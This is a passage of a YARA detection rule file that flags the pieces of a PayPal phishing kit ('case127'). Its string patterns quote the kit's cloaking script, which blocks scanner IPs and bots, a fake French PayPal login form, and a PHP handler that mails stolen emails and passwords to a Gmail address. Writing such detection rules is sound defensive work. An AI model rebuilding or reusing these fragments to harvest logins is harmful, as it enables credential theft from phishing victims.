      ( uint16(0) == 0x3f3c and
         filesize < 7KB and
         ( 8 of them )
      ) or ( all of them )
}

rule PAYPAL_PHISHING_001_infected_06_08_18_case127_files_bots {
   meta:
      description = "case127 - file bots.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-06-08"
      hash1 = "41af449e6806caeb6c0679cecaebc0bb8b2e7b7f2b1351ed4c8788014dfdbbfa"
   strings:
      $s1 = "$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);" fullword ascii
      $s2 = "178.*\", \"68.65.53.71\", \"^198.25.*.*\", \"^64.106.213.*\", \"^91.103.66.*\", \"^208.91.115.*\", \"^199.30.228.*\");" fullword ascii
      $s3 = "header(\"HTTP/1.0 404 Not Found\");" fullword ascii
      $s4 = "if (substr_count($hostname, $word) > 0) {" fullword ascii
      $s5 = "if(preg_match('/' . $ip . '/',$_SERVER['REMOTE_ADDR'])){" fullword ascii
      $s6 = "die(\"<h1>404 Not Found</h1>The page that you have requested could not be found.\");" fullword ascii
      $s7 = "$bannedIP = array(\"^81.161.59.*\", \"^66.135.200.*\", \"^66.102.*.*\", \"^38.100.*.*\", \"^107.170.*.*\", \"^149.20.*.*\", \"^3" ascii
      $s8 = "if(in_array($_SERVER['REMOTE_ADDR'],$bannedIP)) {" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 6KB and
         ( all of them )
      ) or ( all of them )
}

rule PAYPAL_PHISHING_001_infected_06_08_18_case127_pfr {
   meta:
      description = "case127 - file pfr.zip"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-06-08"
      hash1 = "72f57bb63927967259bbc740d1dce85f1bdb99458933a9d91e164d02051fa216"
   strings:
      $s1 = "files/my/ID/identity/css/themes/jquery.filer-dragdropbox-theme.css" fullword ascii
      $s2 = "files/css/paypal_logo_center.png" fullword ascii
      $s3 = "files/my/ID/identity/images/ppcom_monogram.svg}V" fullword ascii
      $s4 = "files/file/template.css" fullword ascii
      $s5 = "files/css/themes/jquery.filer-dragdropbox-theme.css" fullword ascii
      $s6 = "files/css/peek-shield-logo.png" fullword ascii
      $s7 = "files/images/logo.png}Vy8T{" fullword ascii
      $s8 = "files/my/ID/identity/images/ppcom_monogram.svg" fullword ascii
      $s9 = "files/my/ID/identity/assets/fonts/jquery.filer-icons/jquery-filer.svg" fullword ascii
      $s10 = "files/my/ID/identity/assets/fonts/jquery.filer-icons/jquery-filer.ttf" fullword ascii
      $s11 = "files/my/ID/identity/assets/fonts/jquery.filer-icons/jquery-filer.css" fullword ascii
      $s12 = "files/my/ID/identity/assets/fonts/jquery.filer-icons/jquery-filer.eot" fullword ascii
      $s13 = "files/img/logo.png" fullword ascii
      $s14 = "files/images/logo.png" fullword ascii
      $s15 = "files/css/authflow_illustrations.png" fullword ascii
      $s16 = "files/my/ID/identity/images/ppcom.svg" fullword ascii
      $s17 = "files/javascript/jquery-1.11.2.min.js" fullword ascii
      $s18 = "files/css/peek-shield-logo.pnguW" fullword ascii
      $s19 = "r3zult/index.txt" fullword ascii
      $s20 = "files/my/ID/identity/assets/fonts/jquery.filer-icons/jquery-filer-preview.html" fullword ascii
   condition:
      ( uint16(0) == 0x4b50 and
         filesize < 3000KB and
         ( 8 of them )
      ) or ( all of them )
}

rule PAYPAL_PHISHING_001_infected_06_08_18_case127_files_style {
   meta:
      description = "case127 - file style.css"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-06-08"
      hash1 = "562e585efab210b7cbdb49a5f72814f7d561486e7368159e1ef38531d38afc88"
   strings:
      $x1 = "background: transparent url(\"https://www.paypalobjects.com/images/shared/paypal-logo-129x32.svg\") no-repeat scroll center to" fullword ascii
      $x2 = "background: transparent url(\"https://www.paypalobjects.com/images/shared/paypal-logo-129x32.svg\") no-repeat scroll cente" fullword ascii
      $x3 = "background: #FFF7F7 url(\"https://www.paypalobjects.com/images/shared/icon_alert_sprite-2x.png\") no-repeat scroll 10px -386px" fullword ascii
      $x4 = "background: #F8F8F8 url(\"https://www.paypalobjects.com/webstatic/i/ex_ce2/scr/scr_content-bkgd.png\") repeat scroll 0px 0px;" fullword ascii
      $x5 = "background: transparent url(\"https://www.paypalobjects.com/webstatic/i/sprite/sprite_ui.png\") no-repeat scroll right -1684px" fullword ascii
      $x6 = "background: transparent url(\"https://www.paypalobjects.com/webstatic/i/sprite/sprite_ui.png\") no-repeat scroll right -1684px;" fullword ascii
      $s7 = "background: transparent url(\"https://www.paypalobjects.com/webstatic/mktg/consumer/auth/authflow_illustrations.png\") no-repe" fullword ascii
      $s8 = "background: transparent url(\"https://www.paypalobjects.com/webstatic/mktg/consumer/gradients/interior-gradient-top.png\") rep" fullword ascii
      $s9 = "background-image: url(\"https://www.paypalobjects.com/webstatic/i/consumer/onboarding/sprite_form_2x.png\");" fullword ascii
      $s10 = "background: transparent url(\"https://www.paypalobjects.com/images/shared/paypal-logo-129x32.svg\") no-repeat scroll center top " ascii
      $s11 = "background: transparent url(\"https://www.paypalobjects.com/images/shared/paypal-logo-129x32.svg\") no-repeat scroll center top " ascii
      $s12 = "background: transparent url(\"https://www.paypalobjects.com/images/shared/paypal-logo-129x32.svg\") no-repeat scroll center top " ascii
      $s13 = "background: #FFF7F7 url(\"https://www.paypalobjects.com/images/shared/icon_alert_sprite-2x.png\") no-repeat scroll 10px -386px /" ascii
      $s14 = "background: transparent url(\"https://www.paypalobjects.com/webstatic/mktg/consumer/auth/authflow_illustrations.png\") no-repeat" ascii
      $s15 = "background: transparent url(\"img/sprites_cc_global.png\") no-repeat scroll 0 -337px / 100% auto;" fullword ascii
      $s16 = "background: transparent url(\"img/sprites_cc_global.png\") no-repeat scroll 0 -314px / 100% auto;" fullword ascii
      $s17 = "background: transparent url(\"img/sprites_cc_global.png\") no-repeat scroll 0px -337px / 100% auto;" fullword ascii
      $s18 = "background: transparent url(\"authflow_illustrations.png\") no-repeat scroll 0px 0px / 180px auto;" fullword ascii
      $s19 = "background: transparent url(\"hero_security.png\") no-repeat scroll -17px 0px / 180px auto;" fullword ascii
      $s20 = "background: url(\"img/sprites_cc_global.png\") no-repeat scroll 0 -66px / 100% auto;" fullword ascii
   condition:
      ( uint16(0) == 0x0a0d and
         filesize < 70KB and
         ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule htaccess {
   meta:
      description = "case127 - file htaccess"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-06-08"
      hash1 = "12a5ff666829220eeadb0496eea0481308387824ea6e3fcaabfe4b1d449a7565"
   strings:
      $x1 = "RewriteCond %{HTTP_USER_AGENT} webclipping [NC,OR] # bandwidth waster webclipping.com " fullword ascii
      $x2 = "RewriteCond %{HTTP_USER_AGENT} madlyrics [NC,OR] # Winamp downloader " fullword ascii
      $x3 = "RewriteCond %{HTTP_USER_AGENT} picsearch [NC,OR] # Picture Downloader " fullword ascii
      $x4 = "RewriteCond %{HTTP_USER_AGENT} psbot [NC,OR] # Picture Downloader " fullword ascii
      $x5 = "RewriteCond %{HTTP_USER_AGENT} dloader [NC,OR] # unknown downloader " fullword ascii
      $x6 = "RewriteCond %{HTTP_USER_AGENT} hloader [NC,OR] # unknown downloader " fullword ascii
      $x7 = "RewriteCond %{HTTP_USER_AGENT} trademark [NC,OR] # bandwidth waster trademarktracker.com " fullword ascii
      $x8 = "RewriteCond %{HTTP_USER_AGENT} \"addresses\\.com\" [NC,OR] # spambot " fullword ascii
      $s9 = "RewriteCond %{HTTP_USER_AGENT} e?mail.?(collector|magnet|reaper|siphon|sweeper|harvest|collect|wolf) [NC,OR] # spambots " fullword ascii
      $s10 = "RewriteCond %{HTTP_USER_AGENT} web.?(auto|bandit|collector|copier|devil|downloader|fetch|hook|mole|miner|mirror|reaper|sauger|su" ascii
      $s11 = "RewriteCond %{HTTP_USER_AGENT} ConveraCrawler [NC,OR] # convera.com " fullword ascii
      $s12 = "RewriteCond %{HTTP_USER_AGENT} web.?(auto|bandit|collector|copier|devil|downloader|fetch|hook|mole|miner|mirror|reaper|sauger|su" ascii
      $s13 = "RewriteCond %{HTTP_USER_AGENT} linksmanager [NC,OR] # linksmanager.com spambot " fullword ascii
      $s14 = "RewriteCond %{HTTP_USER_AGENT} girafabot [NC,OR] # girafa.com SE thingy " fullword ascii
      $s15 = "RewriteCond %{HTTP_USER_AGENT} cjnetworkquality [NC,OR] # cj.com bot " fullword ascii
      $s16 = "RewriteCond %{HTTP_USER_AGENT} twiceler [NC,OR] # www.cuill.com " fullword ascii
      $s17 = "RewriteCond %{HTTP_USER_AGENT} ocelli [NC,OR] # www.globalspec.com " fullword ascii
      $s18 = "RewriteCond %{HTTP_USER_AGENT} \"mozilla\\(ie compatible\\)\" [NC,OR] # BS agent " fullword ascii
      $s19 = "RewriteCond %{HTTP_USER_AGENT} \"www.abot.com\" [NC,OR] " fullword ascii
      $s20 = "RewriteCond %{HTTP_USER_AGENT} convera [NC,OR] # convera.com " fullword ascii
   condition:
      ( uint16(0) == 0x4c3c and
         filesize < 100KB and
         ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule Connexion {
   meta:
      description = "case127 - file Connexion.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-06-08"
      hash1 = "f870c54924b19592e0c7b82c3eb87441b0ff986c6af5100ddff6455a500de638"
   strings:
      $s1 = "<form id=\"loginForm\" method=\"post\" action=\"N_Vier1.php\">" fullword ascii
      $s2 = "<script src=\"http://code.jquery.com/jquery-2.1.4.min.js\"></script>" fullword ascii
      $s3 = "<input pattern=\".{7,}\" required  type=\"password\" name=\"login_password\" placeholder=\"Password\">" fullword ascii
      $s4 = "<input required type=\"email\" name=\"login_email\" placeholder=\"Email\">" fullword ascii
      $s5 = "<button type=\"submit\" name=\"BtnLogin\" class=\"button\">Connexion</button>" fullword ascii
      $s6 = "$(\"#loginForm\").submit(function(){" fullword ascii
      $s7 = "<?php if(isset($_GET['error']) == \"true\"){" fullword ascii
      $s8 = "<link href=\"css/style.css\" rel=\"stylesheet\" type=\"text/css\">" fullword ascii
      $s9 = "<title>Connectez-vous &agrave; votre compte PayPal</title>" fullword ascii
      $s10 = "<meta name=\"robots\" content=\"noindex\" />" fullword ascii
      $s11 = "<link rel=\"icon\" type=\"img/png\" href=\"img/favicon.ico\">" fullword ascii
      $s12 = "Certaines de vos informations ne sont pas correctes. Veuillez r&eacute;essayer." fullword ascii
      $s13 = "include 'config.php';" fullword ascii
      $s14 = "$(\".textinput input\").keyup(function () {" fullword ascii
      $s15 = "if ($.trim($(this).val()).length == 0){" fullword ascii
      $s16 = "<li><a href=\"#\">Respect de la vie priv&eacute;e</a></li>" fullword ascii
      $s17 = "$('.spinner').css(\"display\",'block');" fullword ascii
      $s18 = "$('.contenair').css('opacity','0.1');" fullword ascii
      $s19 = "$('.footer').css('opacity','0.1');" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 9KB and
         ( 8 of them )
      ) or ( all of them )
}

rule PAYPAL_PHISHING_001_infected_06_08_18_case127_files_N_Vier1 {
   meta:
      description = "case127 - file N_Vier1.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-06-08"
      hash1 = "3e15a86132e2a3423bc3101968c1b7e5ec2a23729f60640635024908db3654a4"
   strings:
      $s1 = "$subject = 'Login Account [ '.$country.' - '.$_SERVER['REMOTE_ADDR'].' ]';" fullword ascii
      $s2 = "header(\"location: suspicious.php?cmd=_account-details&session=\".md5(microtime()).\"&dispatch=\".sha1(microtime()));" fullword ascii
      $s3 = "$dump = unserialize(file_get_contents($u));" fullword ascii
      $s4 = "$message .= '|Password            :  '.$_POST['login_password'].\"\\r\\n\";" fullword ascii
      $s5 = "$message .= '|Email               :  '.$_POST['login_email'].\"\\r\\n\";" fullword ascii
      $s6 = "$u = \"http://www.geoiptool.com/?IP='$ip'\";" fullword ascii
      $s7 = "$message .= \"IP Geo       : http://www.geoiptool.com/?IP=\".$ip.\"  ====\\n\";" fullword ascii
      $s8 = "mail(\"rezult277@gmail.com\", $subject, $message);" fullword ascii
      $s9 = "$country = $dump[\"geoplugin_countryName\"];" fullword ascii
      $s10 = "$ip = getenv(\"REMOTE_ADDR\");" fullword ascii
      $s11 = "$messags   =  \"http://\".$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI'].\"\\r\\n\";" fullword ascii
      $s12 = "$message = '|================ bs7a rzlt ===============|'.\"\\r\\n\";" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 2KB and
         ( 8 of them )
      ) or ( all of them )
}

/* Super Rules ------------------------------------------------------------- */

